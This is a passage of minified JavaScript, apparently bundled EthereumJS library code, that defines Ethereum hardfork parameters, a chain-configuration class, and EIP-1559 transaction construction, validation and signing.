                d: "Base fee of the SLOAD opcode"
            }
        },
        vm: {},
        pow: {}
    }
      , ek = {
        name: "muirGlacier",
        comment: "HF to delay the difficulty bomb",
        url: "https://eips.ethereum.org/EIPS/eip-2384",
        status: "Final",
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {
            difficultyBombDelay: {
                v: 9e6,
                d: "the amount of blocks to delay the difficulty bomb with"
            }
        }
    }
      , tk = {
        name: "berlin",
        comment: "HF targeted for July 2020 following the Muir Glacier HF",
        url: "https://eips.ethereum.org/EIPS/eip-2070",
        status: "Final",
        eips: [2565, 2929, 2718, 2930]
    }
      , nk = {
        name: "london",
        comment: "HF targeted for July 2021 following the Berlin fork",
        url: "https://github.com/ethereum/eth1.0-specs/blob/master/network-upgrades/mainnet-upgrades/london.md",
        status: "Final",
        eips: [1559, 3198, 3529, 3541]
    }
      , ik = {
        name: "shanghai",
        comment: "Next feature hardfork after the merge hardfork having withdrawals, warm coinbase, push0, limit/meter initcode",
        url: "https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/shanghai.md",
        status: "Final",
        eips: [3651, 3855, 3860, 4895]
    }
      , rk = {
        name: "arrowGlacier",
        comment: "HF to delay the difficulty bomb",
        url: "https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/arrow-glacier.md",
        status: "Final",
        eips: [4345],
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {}
    }
      , sk = {
        name: "grayGlacier",
        comment: "Delaying the difficulty bomb to Mid September 2022",
        url: "https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/gray-glacier.md",
        status: "Draft",
        eips: [5133],
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {}
    }
      , ak = {
        name: "mergeForkIdTransition",
        comment: "Pre-merge hardfork to fork off non-upgraded clients",
        url: "https://eips.ethereum.org/EIPS/eip-3675",
        status: "Draft",
        eips: []
    }
      , ok = {
        name: "merge",
        comment: "Hardfork to upgrade the consensus mechanism to Proof-of-Stake",
        url: "https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/merge.md",
        status: "Final",
        consensus: {
            type: "pos",
            algorithm: "casper",
            casper: {}
        },
        eips: [3675, 4399]
    }
      , lk = {
        chainstart: Q3,
        homestead: Y3,
        dao: V3,
        tangerineWhistle: Z3,
        spuriousDragon: K3,
        byzantium: X3,
        constantinople: J3,
        petersburg: $3,
        istanbul: W3,
        muirGlacier: ek,
        berlin: tk,
        london: nk,
        shanghai: ik,
        arrowGlacier: rk,
        grayGlacier: sk,
        mergeForkIdTransition: ak,
        merge: ok
    }
      , {buf: ck} = b3;
    class It extends n0 {
        static custom(e, n={}) {
            var s;
            const o = (s = n.baseChain) !== null && s !== void 0 ? s : "mainnet"
              , l = Object.assign({}, It._getChainParams(o));
            if (l.name = "custom-chain",
            typeof e != "string")
                return new It(Object.assign({
                    chain: Object.assign(Object.assign({}, l), e)
                }, n));
            if (e === Vt.PolygonMainnet)
                return It.custom({
                    name: Vt.PolygonMainnet,
                    chainId: 137,
                    networkId: 137
                }, n);
            if (e === Vt.PolygonMumbai)
                return It.custom({
                    name: Vt.PolygonMumbai,
                    chainId: 80001,
                    networkId: 80001
                }, n);
            if (e === Vt.ArbitrumRinkebyTestnet)
                return It.custom({
                    name: Vt.ArbitrumRinkebyTestnet,
                    chainId: 421611,
                    networkId: 421611
                }, n);
            if (e === Vt.ArbitrumOne)
                return It.custom({
                    name: Vt.ArbitrumOne,
                    chainId: 42161,
                    networkId: 42161
                }, n);
            if (e === Vt.xDaiChain)
                return It.custom({
                    name: Vt.xDaiChain,
                    chainId: 100,
                    networkId: 100
                }, n);
            if (e === Vt.OptimisticKovan)
                return It.custom({
                    name: Vt.OptimisticKovan,
                    chainId: 69,
                    networkId: 69
                }, Object.assign({
                    hardfork: ot.Berlin
                }, n));
            if (e === Vt.OptimisticEthereum)
                return It.custom({
                    name: Vt.OptimisticEthereum,
                    chainId: 10,
                    networkId: 10
                }, Object.assign({
                    hardfork: ot.Berlin
                }, n));
            throw new Error(`Custom chain ${e} not supported`)
        }
        static fromGethGenesis(e, {chain: n, eips: s, genesisHash: o, hardfork: l, mergeForkIdPostMerge: u}) {
            var d;
            const p = c3(e, n, u)
              , h = new It({
                chain: (d = p.name) !== null && d !== void 0 ? d : "custom",
                customChains: [p],
                eips: s,
                hardfork: l ?? p.hardfork
            });
            return o !== void 0 && h.setForkHashes(o),
            h
        }
        static isSupportedChainId(e) {
            return !!this._getInitializedChains().names[e.toString()]
        }
        static _getChainParams(e, n) {
            let s = e;
            const o = this._getInitializedChains(n);
            if (typeof s == "number" || typeof s == "bigint") {
                if (s = s.toString(),
                o.names[s]) {
                    const l = o.names[s];
                    return o[l]
                }
                throw new Error(`Chain with ID ${s} not supported`)
            }
            if (o[s] !== void 0)
                return o[s];
            throw new Error(`Chain with name ${s} not supported`)
        }
        constructor(e) {
            var n, s;
            super(),
            this._eips = [],
            this._customChains = (n = e.customChains) !== null && n !== void 0 ? n : [],
            this._chainParams = this.setChain(e.chain),
            this.DEFAULT_HARDFORK = (s = this._chainParams.defaultHardfork) !== null && s !== void 0 ? s : ot.Merge,
            this.HARDFORK_CHANGES = this.hardforks().map(o => [o.name, lk[o.name]]),
            this._hardfork = this.DEFAULT_HARDFORK,
            e.hardfork !== void 0 && this.setHardfork(e.hardfork),
            e.eips && this.setEIPs(e.eips)
        }
        setChain(e) {
            if (typeof e == "number" || typeof e == "bigint" || typeof e == "string")
                this._chainParams = It._getChainParams(e, this._customChains);
            else if (typeof e == "object") {
                if (this._customChains.length > 0)
                    throw new Error("Chain must be a string, number, or bigint when initialized with customChains passed in");
                const n = ["networkId", "genesis", "hardforks", "bootstrapNodes"];
                for (const s of n)
                    if (!(s in e))
                        throw new Error(`Missing required chain parameter: ${s}`);
                this._chainParams = e
            } else
                throw new Error("Wrong input format");
            for (const n of this.hardforks())
                if (n.block === void 0)
                    throw new Error("Hardfork cannot have undefined block number");
            return this._chainParams
        }
        setHardfork(e) {
            let n = !1;
            for (const s of this.HARDFORK_CHANGES)
                s[0] === e && (this._hardfork !== e && (this._hardfork = e,
                this.emit("hardforkChanged", e)),
                n = !0);
            if (!n)
                throw new Error(`Hardfork with name ${e} not supported`)
        }
        getHardforkByBlockNumber(e, n, s) {
            const o = Ba(e, qn.BigInt)
              , l = Ba(n, qn.BigInt)
              , u = Ba(s, qn.Number)
              , d = this.hardforks().filter(E => E.block !== null || E.ttd !== null && E.ttd !== void 0 || E.timestamp !== void 0)
              , p = d.findIndex(E => E.ttd !== null && E.ttd !== void 0);
            if (d.slice(p + 1).findIndex(E => E.ttd !== null && E.ttd !== void 0) >= 0)
                throw Error("More than one merge hardforks found with ttd specified");
            let m = d.findIndex(E => E.block !== null && E.block > o || u !== void 0 && Number(E.timestamp) > u);
            if (m === -1)
                m = d.length;
            else if (m === 0)
                throw Error("Must have at least one hardfork at block 0");
            if (u === void 0) {
                const E = d.slice(0, m).reverse().findIndex(S => S.block !== null || S.ttd !== void 0);
                m -= E
            }
            if (m -= 1,
            d[m].block === null && d[m].timestamp === void 0)
                (l == null || BigInt(d[m].ttd) > l) && (m -= 1);
            else if (p >= 0 && l !== void 0 && l !== null) {
                if (m >= p && BigInt(d[p].ttd) > l)
                    throw Error("Maximum HF determined by total difficulty is lower than the block number HF");
                if (m < p && BigInt(d[p].ttd) <= l)
                    throw Error("HF determined by block number is lower than the minimum total difficulty HF")
            }
            const y = m;
            for (; m < d.length - 1 && !(d[m].block !== d[m + 1].block || d[m].timestamp !== d[m + 1].timestamp); m += 1)
                ;
            if (u) {
                if (d.slice(0, y).reduce( (_, x) => {
                    var b;
                    return Math.max(Number((b = x.timestamp) !== null && b !== void 0 ? b : "0"), _)
                }
                , 0) > u)
                    throw Error("Maximum HF determined by timestamp is lower than the block number/ttd HF");
                if (d.slice(m + 1).reduce( (_, x) => {
                    var b;
                    return Math.min(Number((b = x.timestamp) !== null && b !== void 0 ? b : u), _)
                }
                , u) < u)
                    throw Error("Maximum HF determined by block number/ttd is lower than timestamp HF")
            }
            return d[m].name
        }
        setHardforkByBlockNumber(e, n, s) {
            const o = this.getHardforkByBlockNumber(e, n, s);
            return this.setHardfork(o),
            o
        }
        _getHardfork(e) {
            const n = this.hardforks();
            for (const s of n)
                if (s.name === e)
                    return s;
            return null
        }
        setEIPs(e=[]) {
            for (const n of e) {
                if (!(n in Ca))
                    throw new Error(`${n} not supported`);
                const s = this.gteHardfork(Ca[n].minimumHardfork);
                if (!s)
                    throw new Error(`${n} cannot be activated on hardfork ${this.hardfork()}, minimumHardfork: ${s}`);
                if (Ca[n].requiredEIPs !== void 0) {
                    for (const o of Ca[n].requiredEIPs)
                        if (!(e.includes(o) || this.isActivatedEIP(o)))
                            throw new Error(`${n} requires EIP ${o}, but is not included in the EIP list`)
                }
            }
            this._eips = e
        }
        param(e, n) {
            let s;
            for (const o of this._eips)
                if (s = this.paramByEIP(e, n, o),
                s !== void 0)
                    return s;
            return this.paramByHardfork(e, n, this._hardfork)
        }
        paramByHardfork(e, n, s) {
            let o = null;
            for (const l of this.HARDFORK_CHANGES) {
                if ("eips"in l[1]) {
                    const u = l[1].eips;
                    for (const d of u) {
                        const p = this.paramByEIP(e, n, d);
                        o = typeof p == "bigint" ? p : o
                    }
                } else {
                    if (l[1][e] === void 0)
                        throw new Error(`Topic ${e} not defined`);
                    l[1][e][n] !== void 0 && (o = l[1][e][n].v)
                }
                if (l[0] === s)
                    break
            }
            return BigInt(o ?? 0)
        }
        paramByEIP(e, n, s) {
            if (!(s in Ca))
                throw new Error(`${s} not supported`);
            const o = Ca[s];
            if (!(e in o))
                throw new Error(`Topic ${e} not defined`);
            if (o[e][n] === void 0)
                return;
            const l = o[e][n].v;
            return BigInt(l)
        }
        paramByBlock(e, n, s, o, l) {
            const u = this.getHardforkByBlockNumber(s, o, l);
            return this.paramByHardfork(e, n, u)
        }
        isActivatedEIP(e) {
            if (this.eips().includes(e))
                return !0;
            for (const n of this.HARDFORK_CHANGES) {
                const s = n[1];
                if (this.gteHardfork(s.name) && "eips"in s && s.eips.includes(e))
                    return !0
            }
            return !1
        }
        hardforkIsActiveOnBlock(e, n) {
            const s = Ba(n, qn.BigInt)
              , o = e ?? this._hardfork
              , l = this.hardforkBlock(o);
            return typeof l == "bigint" && l !== BigInt(0) && s >= l
        }
        activeOnBlock(e) {
            return this.hardforkIsActiveOnBlock(null, e)
        }
        hardforkGteHardfork(e, n) {
            const s = e ?? this._hardfork
              , o = this.hardforks();
            let l = -1
              , u = -1
              , d = 0;
            for (const p of o)
                p.name === s && (l = d),
                p.name === n && (u = d),
                d += 1;
            return l >= u && u !== -1
        }
        gteHardfork(e) {
            return this.hardforkGteHardfork(null, e)
        }
        hardforkBlock(e) {
            var n;
            const s = e ?? this._hardfork
              , o = (n = this._getHardfork(s)) === null || n === void 0 ? void 0 : n.block;
            return o == null ? null : BigInt(o)
        }
        hardforkTimestamp(e) {
            var n;
            const s = e ?? this._hardfork
              , o = (n = this._getHardfork(s)) === null || n === void 0 ? void 0 : n.timestamp;
            return o == null ? null : BigInt(o)
        }
        eipBlock(e) {
            for (const n of this.HARDFORK_CHANGES) {
                const s = n[1];
                if ("eips"in s && s.eips.includes(e))
                    return this.hardforkBlock(typeof n[0] == "number" ? String(n[0]) : n[0])
            }
            return null
        }
        hardforkTTD(e) {
            var n;
            const s = e ?? this._hardfork
              , o = (n = this._getHardfork(s)) === null || n === void 0 ? void 0 : n.ttd;
            return o == null ? null : BigInt(o)
        }
        isHardforkBlock(e, n) {
            const s = Ba(e, qn.BigInt)
              , o = n ?? this._hardfork
              , l = this.hardforkBlock(o);
            return typeof l == "bigint" && l !== BigInt(0) ? l === s : !1
        }
        nextHardforkBlockOrTimestamp(e) {
            var n, s, o;
            const l = (n = e) !== null && n !== void 0 ? n : this._hardfork
              , u = this.hardforks();
            let d = u.findIndex(y => y.name === l);
            if (l === ot.Merge && (d -= 1),
            d < 0)
                return null;
            let p = (s = u[d].timestamp) !== null && s !== void 0 ? s : u[d].block;
            p = p != null ? Number(p) : null;
            const h = u.slice(d + 1).find(y => {
                var w;
                let E = (w = y.timestamp) !== null && w !== void 0 ? w : y.block;
                return E = E != null ? Number(E) : null,
                y.name !== ot.Merge && E !== null && E !== void 0 && E !== p
            }
            );
            if (h === void 0)
                return null;
            const m = (o = h.timestamp) !== null && o !== void 0 ? o : h.block;
            return m == null ? null : BigInt(m)
        }
        nextHardforkBlock(e) {
            var n;
            const s = (n = e) !== null && n !== void 0 ? n : this._hardfork;
            let o = this.hardforkBlock(s);
            if (o === null && s === ot.Merge) {
                const u = this.hardforks()
                  , d = u.findIndex(p => p.ttd !== null && p.ttd !== void 0);
                if (d < 0)
                    throw Error("Merge hardfork should have been found");
                o = this.hardforkBlock(u[d - 1].name)
            }
            return o === null ? null : this.hardforks().reduce( (u, d) => {
                const p = BigInt(d.block === null || d.ttd !== void 0 && d.ttd !== null ? 0 : d.block);
                return p > o && u === null ? p : u
            }
            , null)
        }
        isNextHardforkBlock(e, n) {
            const s = Ba(e, qn.BigInt)
              , o = n ?? this._hardfork
              , l = this.nextHardforkBlock(o);
            return l === null ? !1 : l === s
        }
        _calcForkHash(e, n) {
            let s = new Uint8Array
              , o = 0;
            for (const d of this.hardforks()) {
                const {block: p, timestamp: h, name: m} = d;
                let y = h ?? p;
                if (y = y !== null ? Number(y) : null,
                typeof y == "number" && y !== 0 && y !== o && m !== ot.Merge) {
                    const w = lt(y.toString(16).padStart(16, "0"));
                    s = nn(s, w),
                    o = y
                }
                if (d.name === e)
                    break
            }
            const l = nn(n, s);
            return je(u3(ck(l) >>> 0))
        }
        forkHash(e, n) {
            const s = e ?? this._hardfork
              , o = this._getHardfork(s);
            if (o === null || o?.block === null && o?.timestamp === void 0 && o?.ttd === void 0) {
                const l = "No fork hash calculation possible for future hardfork";
                throw new Error(l)
            }
            if (o?.forkHash !== null && o?.forkHash !== void 0)
                return o.forkHash;
            if (!n)
                throw new Error("genesisHash required for forkHash calculation");
            return this._calcForkHash(s, n)
        }
        hardforkForForkHash(e) {
            const n = this.hardforks().filter(s => s.forkHash === e);
            return n.length >= 1 ? n[n.length - 1] : null
        }
        setForkHashes(e) {
            var n;
            for (const s of this.hardforks()) {
                const o = (n = s.timestamp) !== null && n !== void 0 ? n : s.block;
                (s.forkHash === null || s.forkHash === void 0) && (o != null || typeof s.ttd < "u") && (s.forkHash = this.forkHash(s.name, e))
            }
        }
        genesis() {
            return this._chainParams.genesis
        }
        hardforks() {
            return this._chainParams.hardforks
        }
        bootstrapNodes() {
            return this._chainParams.bootstrapNodes
        }
        dnsNetworks() {
            return this._chainParams.dnsNetworks
        }
        hardfork() {
            return this._hardfork
        }
        chainId() {
            return BigInt(this._chainParams.chainId)
        }
        chainName() {
            return this._chainParams.name
        }
        networkId() {
            return BigInt(this._chainParams.networkId)
        }
        eips() {
            return this._eips
        }
        consensusType() {
            const e = this.hardfork();
            let n;
            for (const s of this.HARDFORK_CHANGES)
                if ("consensus"in s[1] && (n = s[1].consensus.type),
                s[0] === e)
                    break;
            return n ?? this._chainParams.consensus.type
        }
        consensusAlgorithm() {
            const e = this.hardfork();
            let n;
            for (const s of this.HARDFORK_CHANGES)
                if ("consensus"in s[1] && (n = s[1].consensus.algorithm),
                s[0] === e)
                    break;
            return n ?? this._chainParams.consensus.algorithm
        }
        consensusConfig() {
            var e;
            const n = this.hardfork();
            let s;
            for (const o of this.HARDFORK_CHANGES)
                if ("consensus"in o[1] && (s = o[1].consensus[o[1].consensus.algorithm]),
                o[0] === n)
                    break;
            return (e = s ?? this._chainParams.consensus[this.consensusAlgorithm()]) !== null && e !== void 0 ? e : {}
        }
        copy() {
            const e = Object.assign(Object.create(Object.getPrototypeOf(this)), this);
            return e.removeAllListeners(),
            e
        }
        static _getInitializedChains(e) {
            const n = {};
            for (const [o,l] of Object.entries(bd))
                n[l] = o.toLowerCase();
            const s = {
                mainnet: w3,
                goerli: A3,
                sepolia: _3
            };
            if (e)
                for (const o of e) {
                    const {name: l} = o;
                    n[o.chainId.toString()] = l,
                    s[l] = o
                }
            return s.names = n,
            s
        }
    }
    var mi;
    (function(t) {
        t[t.EIP155ReplayProtection = 155] = "EIP155ReplayProtection",
        t[t.EIP1559FeeMarket = 1559] = "EIP1559FeeMarket",
        t[t.EIP2718TypedTransaction = 2718] = "EIP2718TypedTransaction",
        t[t.EIP2930AccessLists = 2930] = "EIP2930AccessLists"
    }
    )(mi || (mi = {}));
    function uk(t) {
        if (t.length === 0)
            return !0;
        const e = t[0];
        return !!Array.isArray(e)
    }
    function dk(t) {
        return !uk(t)
    }
    class Ha {
        constructor(e) {
            if (e.length !== 20)
                throw new Error("Invalid address length");
            this.buf = e
        }
        static zero() {
            return new Ha(zw(20))
        }
        equals(e) {
            return Gd(this.buf, e.buf)
        }
        isZero() {
            return this.equals(Ha.zero())
        }
        toString() {
            return je(this.buf)
        }
        toArray() {
            return this.buf
        }
        static publicToAddress(e, n=!1) {
            let s = e;
            if (b0(s),
            n && s.length !== 64 && (s = ar.ProjectivePoint.fromHex(s).toRawBytes(!1).slice(1)),
            s.length !== 64)
                throw new Error("Expected pubKey to be of length 64");
            return Jt(s).slice(-20)
        }
    }
    const fk = (t, e) => {
        const n = t.param("vm", "maxInitCodeSize");
        if (n && BigInt(e) > n)
            throw new Error(`the initcode size of this transaction is too large: it is ${e} while the max is ${t.param("vm", "maxInitCodeSize")}`)
    }
      , Gw = t => {
        let e, n;
        if (dk(t)) {
            e = t;
            const s = [];
            for (let o = 0; o < t.length; o += 1) {
                const l = t[o]
                  , u = ht(l.address)
                  , d = [];
                for (let p = 0; p < l.storageKeys.length; p += 1)
                    d.push(ht(l.storageKeys[p]));
                s.push([u, d])
            }
            n = s
        } else {
            n = t ?? [];
            const s = [];
            for (let o = 0; o < n.length; o += 1) {
                const l = n[o]
                  , u = je(l[0])
                  , d = [];
                for (let h = 0; h < l[1].length; h += 1)
                    d.push(je(l[1][h]));
                const p = {
                    address: u,
                    storageKeys: d
                };
                s.push(p)
            }
            e = s
        }
        return {
            AccessListJSON: e,
            accessList: n
        }
    }
      , qw = t => {
        for (let e = 0; e < t.length; e += 1) {
            const n = t[e]
              , s = n[0]
              , o = n[1];
            if (n[2] !== void 0)
                throw new Error("Access list item cannot have 3 elements. It can only have an address, and an array of storage slots.");
            if (s.length !== 20)
                throw new Error("Invalid EIP-2930 transaction: address length should be 20 bytes");
            for (let l = 0; l < o.length; l += 1)
                if (o[l].length !== 32)
                    throw new Error("Invalid EIP-2930 transaction: storage slot length should be 32 bytes")
        }
    }
      , Fw = t => {
        const e = [];
        for (let n = 0; n < t.length; n += 1) {
            const s = t[n]
              , o = {
                address: je(DA(s[0], 20)),
                storageKeys: []
            }
              , l = s && s[1];
            for (let u = 0; u < l.length; u += 1) {
                const d = l[u];
                o.storageKeys.push(je(DA(d, 32)))
            }
            e.push(o)
        }
        return e
    }
      , Qw = (t, e) => {
        const n = e.param("gasPrices", "accessListStorageKeyCost")
          , s = e.param("gasPrices", "accessListAddressCost");
        let o = 0;
        for (let u = 0; u < t.length; u += 1) {
            const p = t[u][1];
            o += p.length
        }
        return t.length * Number(s) + o * Number(n)
    }
    ;
    class to {
        constructor(e, n) {
            var s, o;
            this.cache = {
                hash: void 0,
                dataFee: void 0
            },
            this.activeCapabilities = [],
            this.DEFAULT_CHAIN = bd.Mainnet,
            this.DEFAULT_HARDFORK = ot.Merge;
            const {nonce: l, gasLimit: u, to: d, value: p, data: h, v: m, r: y, s: w, type: E} = e;
            this._type = Number(rt(ht(E))),
            this.txOptions = n;
            const S = ht(d === "" ? "0x" : d)
              , _ = ht(m === "" ? "0x" : m)
              , x = ht(y === "" ? "0x" : y)
              , b = ht(w === "" ? "0x" : w);
            this.nonce = rt(ht(l === "" ? "0x" : l)),
            this.gasLimit = rt(ht(u === "" ? "0x" : u)),
            this.to = S.length > 0 ? new Ha(S) : void 0,
            this.value = rt(ht(p === "" ? "0x" : p)),
            this.data = ht(h === "" ? "0x" : h),
            this.v = _.length > 0 ? rt(_) : void 0,
            this.r = x.length > 0 ? rt(x) : void 0,
            this.s = b.length > 0 ? rt(b) : void 0,
            this._validateCannotExceedMaxInteger({
                value: this.value,
                r: this.r,
                s: this.s
            }),
            this._validateCannotExceedMaxInteger({
                gasLimit: this.gasLimit
            }, 64),
            this._validateCannotExceedMaxInteger({
                nonce: this.nonce
            }, 64, !0);
            const I = this.to === void 0 || this.to === null
              , O = (s = n.allowUnlimitedInitCodeSize) !== null && s !== void 0 ? s : !1
              , z = (o = n.common) !== null && o !== void 0 ? o : this._getCommon();
            I && z.isActivatedEIP(3860) && !O && fk(z, this.data.length)
        }
        get type() {
            return this._type
        }
        supports(e) {
            return this.activeCapabilities.includes(e)
        }
        validate(e=!1) {
            const n = [];
            return this.getBaseFee() > this.gasLimit && n.push(`gasLimit is too low. given ${this.gasLimit}, need at least ${this.getBaseFee()}`),
            this.isSigned() && !this.verifySignature() && n.push("Invalid Signature"),
            e ? n : n.length === 0
        }
        _validateYParity() {
            const {v: e} = this;
            if (e !== void 0 && e !== BigInt(0) && e !== BigInt(1)) {
                const n = this._errorMsg("The y-parity of the transaction should either be 0 or 1");
                throw new Error(n)
            }
        }
        _validateHighS() {
            const {s: e} = this;
            if (this.common.gteHardfork("homestead") && e !== void 0 && e > s3) {
                const n = this._errorMsg("Invalid Signature: s-values greater than secp256k1n/2 are considered invalid");
                throw new Error(n)
            }
        }
        getBaseFee() {
            const e = this.common.param("gasPrices", "tx");
            let n = this.getDataFee();
            if (e && (n += e),
            this.common.gteHardfork("homestead") && this.toCreationAddress()) {
                const s = this.common.param("gasPrices", "txCreation");
                s && (n += s)
            }
            return n
        }
        getDataFee() {
            const e = this.common.param("gasPrices", "txDataZero")
              , n = this.common.param("gasPrices", "txDataNonZero");
            let s = BigInt(0);
            for (let o = 0; o < this.data.length; o += 1)
                this.data[o] === 0 ? s += e : s += n;
            if ((this.to === void 0 || this.to === null) && this.common.isActivatedEIP(3860)) {
                const o = BigInt(Math.ceil(this.data.length / 32))
                  , l = this.common.param("gasPrices", "initCodeWordCost") * o;
                s += l
            }
            return s
        }
        toCreationAddress() {
            return this.to === void 0 || this.to.buf.length === 0
        }
        isSigned() {
            const {v: e, r: n, s} = this;
            return !(e === void 0 || n === void 0 || s === void 0)
        }
        verifySignature() {
            try {
                const e = this.getSenderPublicKey();
                return Ad(e).length !== 0
            } catch {
                return !1
            }
        }
        getSenderAddress() {
            return new Ha(Ha.publicToAddress(this.getSenderPublicKey()))
        }
        sign(e) {
            if (e.length !== 32) {
                const p = this._errorMsg("Private key must be 32 bytes in length.");
                throw new Error(p)
            }
            let n = !1;
            this.type === 0 && this.common.gteHardfork("spuriousDragon") && !this.supports(mi.EIP155ReplayProtection) && (this.activeCapabilities.push(mi.EIP155ReplayProtection),
            n = !0);
            const s = this.getMessageToSign(!0)
              , {v: o, r: l, s: u} = this._ecsign(s, e)
              , d = this._processSignature(o, l, u);
            if (n) {
                const p = this.activeCapabilities.indexOf(mi.EIP155ReplayProtection);
                p > -1 && this.activeCapabilities.splice(p, 1)
            }
            return d
        }
        _getCommon(e, n) {
            var s, o, l, u;
            if (n !== void 0) {
                const d = rt(ht(n));
                if (e) {
                    if (e.chainId() !== d) {
                        const p = this._errorMsg("The chain ID does not match the chain ID of Common");
                        throw new Error(p)
                    }
                    return e.copy()
                }
                return It.isSupportedChainId(d) ? new It({
                    chain: d,
                    hardfork: this.DEFAULT_HARDFORK
                }) : It.custom({
                    name: "custom-chain",
                    networkId: d,
                    chainId: d
                }, {
                    baseChain: this.DEFAULT_CHAIN,
                    hardfork: this.DEFAULT_HARDFORK
                })
            }
            if (e?.copy && typeof e?.copy == "function")
                return e.copy();
            if (e) {
                const d = typeof e.hardfork == "function" ? e.hardfork() : e.hardfork;
                return It.custom({
                    name: "custom-chain",
                    networkId: e.networkId ? e.networkId() : (o = BigInt((s = e.customChain) === null || s === void 0 ? void 0 : s.networkId)) !== null && o !== void 0 ? o : void 0,
                    chainId: e.chainId ? e.chainId() : (u = BigInt((l = e.customChain) === null || l === void 0 ? void 0 : l.chainId)) !== null && u !== void 0 ? u : void 0
                }, {
                    baseChain: this.DEFAULT_CHAIN,
                    hardfork: d || this.DEFAULT_HARDFORK
                })
            }
            return new It({
                chain: this.DEFAULT_CHAIN,
                hardfork: this.DEFAULT_HARDFORK
            })
        }
        _validateCannotExceedMaxInteger(e, n=256, s=!1) {
            for (const [o,l] of Object.entries(e))
                switch (n) {
                case 64:
                    if (s) {
                        if (l !== void 0 && l >= OA) {
                            const u = this._errorMsg(`${o} cannot equal or exceed MAX_UINT64 (2^64-1), given ${l}`);
                            throw new Error(u)
                        }
                    } else if (l !== void 0 && l > OA) {
                        const u = this._errorMsg(`${o} cannot exceed MAX_UINT64 (2^64-1), given ${l}`);
                        throw new Error(u)
                    }
                    break;
                case 256:
                    if (s) {
                        if (l !== void 0 && l >= Zl) {
                            const u = this._errorMsg(`${o} cannot equal or exceed MAX_INTEGER (2^256-1), given ${l}`);
                            throw new Error(u)
                        }
                    } else if (l !== void 0 && l > Zl) {
                        const u = this._errorMsg(`${o} cannot exceed MAX_INTEGER (2^256-1), given ${l}`);
                        throw new Error(u)
                    }
                    break;
                default:
                    {
                        const u = this._errorMsg("unimplemented bits value");
                        throw new Error(u)
                    }
                }
        }
        static _validateNotArray(e) {
            const n = ["nonce", "gasPrice", "gasLimit", "to", "value", "data", "v", "r", "s", "type", "baseFee", "maxFeePerGas", "chainId"];
            for (const [s,o] of Object.entries(e))
                if (n.includes(s) && Array.isArray(o))
                    throw new Error(`${s} cannot be an array`)
        }
        _getSharedErrorPostfix() {
            let e = "";
            try {
                e = this.isSigned() ? je(this.hash()) : "not available (unsigned)"
            } catch {
                e = "error"
            }
            let n = "";
            try {
                n = this.isSigned().toString()
            } catch {
                e = "error"
            }
            let s = "";
            try {
                s = this.common.hardfork()
            } catch {
                s = "error"
            }
            let o = `tx type=${this.type} hash=${e} nonce=${this.nonce} value=${this.value} `;
            return o += `signed=${n} hf=${s}`,
            o
        }
        _ecsign(e, n, s) {
            const o = ar.sign(e, n)
              , l = o.toCompactRawBytes()
              , u = l.subarray(0, 32)
              , d = l.subarray(32, 64)
              , p = s === void 0 ? BigInt(o.recovery + 27) : BigInt(o.recovery + 35) + BigInt(s) * BigInt(2);
            return {
                r: u,
                s: d,
                v: p
            }
        }
        static fromSerializedTx(e, n={}) {}
        static fromTxData(e, n={}) {}
    }
    const pp = 2
      , zm = lt(pp.toString(16).padStart(2, "0"));
    class ys extends to {
        static fromTxData(e, n={}) {
            return new ys(e,n)
        }
        static fromSerializedTx(e, n={}) {
            if (!Gd(e.subarray(0, 1), zm))
                throw new Error(`Invalid serialized tx input: not an EIP-1559 transaction (wrong tx type, expected: ${pp}, received: ${je(e.subarray(0, 1))}`);
            const s = Fn.RLP.decode(e.subarray(1));
            if (!Array.isArray(s))
                throw new Error("Invalid serialized tx input: must be array");
            return ys.fromValuesArray(s, n)
        }
        static fromValuesArray(e, n={}) {
            if (e.length !== 9 && e.length !== 12)
                throw new Error("Invalid EIP-1559 transaction. Only expecting 9 values (for unsigned tx) or 12 values (for signed tx).");
            const [s,o,l,u,d,p,h,m,y,w,E,S] = e;
            return this._validateNotArray({
                chainId: s,
                v: w
            }),
            $p({
                nonce: o,
                maxPriorityFeePerGas: l,
                maxFeePerGas: u,
                gasLimit: d,
                value: h,
                v: w,
                r: E,
                s: S
            }),
            new ys({
                chainId: rt(s),
                nonce: o,
                maxPriorityFeePerGas: l,
                maxFeePerGas: u,
                gasLimit: d,
                to: p,
                value: h,
                data: m,
                accessList: y ?? [],
                v: w !== void 0 ? rt(w) : void 0,
                r: E,
                s: S
            },n)
        }
        constructor(e, n={}) {
            var s;
            super(Object.assign(Object.assign({}, e), {
                type: pp
            }), n),
            this.DEFAULT_HARDFORK = "london";
            const {chainId: o, accessList: l, maxFeePerGas: u, maxPriorityFeePerGas: d} = e;
            if (this.common = this._getCommon(n.common, o),
            this.chainId = this.common.chainId(),
            !this.common.isActivatedEIP(1559))
                throw new Error("EIP-1559 not enabled on Common");
            this.activeCapabilities = this.activeCapabilities.concat([1559, 2718, 2930]);
            const p = Gw(l ?? []);
            if (this.accessList = p.accessList,
            this.AccessListJSON = p.AccessListJSON,
            qw(this.accessList),
            this.maxFeePerGas = rt(ht(u === "" ? "0x" : u)),
            this.maxPriorityFeePerGas = rt(ht(d === "" ? "0x" : d)),
            this._validateCannotExceedMaxInteger({
                maxFeePerGas: this.maxFeePerGas,
                maxPriorityFeePerGas: this.maxPriorityFeePerGas
            }),
            to._validateNotArray(e),
            this.gasLimit * this.maxFeePerGas > Zl) {
                const m = this._errorMsg("gasLimit * maxFeePerGas cannot exceed MAX_INTEGER (2^256-1)");
                throw new Error(m)
            }
            if (this.maxFeePerGas < this.maxPriorityFeePerGas) {
                const m = this._errorMsg("maxFeePerGas cannot be less than maxPriorityFeePerGas (The total must be the larger of the two)");
                throw new Error(m)
            }
            this._validateYParity(),
            this._validateHighS(),
            ((s = n?.freeze) !== null && s !== void 0 ? s : !0) && Object.freeze(this)
        }
        getDataFee() {
            if (this.cache.dataFee && this.cache.dataFee.hardfork === this.common.hardfork())
                return this.cache.dataFee.value;
            let e = super.getDataFee();
            return e += BigInt(Qw(this.accessList, this.common)),
            Object.isFrozen(this) && (this.cache.dataFee = {
                value: e,
                hardfork: this.common.hardfork()
            }),
            e
        }
        getUpfrontCost(e=BigInt(0)) {
            const n = this.maxPriorityFeePerGas
